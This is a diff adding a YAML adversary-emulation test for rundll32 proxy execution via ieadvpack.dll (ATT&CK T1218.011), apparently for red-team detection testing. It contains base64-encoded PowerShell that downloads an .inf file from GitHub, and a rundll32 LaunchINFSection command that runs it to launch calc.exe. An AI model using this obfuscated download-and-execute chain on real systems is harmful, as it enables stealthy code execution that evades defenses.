@@ -1,0 +1,23 @@
+- id: a078ad0f-0a11-5326-ac2d-e67dd8e3ac62
+  name: Soumaia ART Tests - Rundll32 ieadvpack.dll Execution
+  description: 'Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+    Upon execution calc.exe will be launched
+
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml'
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMQAxAC4AaQBuAGYAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADEAMQAuAGkAbgBmACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMgAxADgALgAwADEAMQAvAHMAcgBjAC8AVAAxADIAMQA4AC4AMAAxADEALgBpAG4AZgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADIAMQA4AC4AMAAxADEALgBpAG4AZgAiAAoA
+          )
+          rundll32.exe ieadvpack.dll,LaunchINFSection ".\T1218.011.inf",DefaultInstall_SingleUser,1,
+        payloads:
+        - T1218.011.inf
